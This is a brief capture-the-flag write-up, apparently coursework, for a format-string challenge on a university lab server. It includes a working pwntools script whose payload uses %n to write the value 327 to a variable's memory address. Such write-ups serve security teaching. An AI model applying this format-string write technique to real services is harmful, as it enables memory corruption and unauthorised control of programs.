# Challenge `Write Specific Value` writeup

- Vulnerability:
  - Format string
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port 23194
- Impact:
  - Allows user to alter local variable

## Steps to reproduce

1. Using `gdb` we can verify that `target` is stored in memory address `0x804c040`
2. On this version, the variable must be exactly 327, so the input string needs to changed (while compensating for the 4 bytes written previously)

The code used was the following:

```py
from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 23194, timeout=100)
s.sendline(b"\x40\xc0\x04\x08%323x%7$n")
print(s.recvall())
```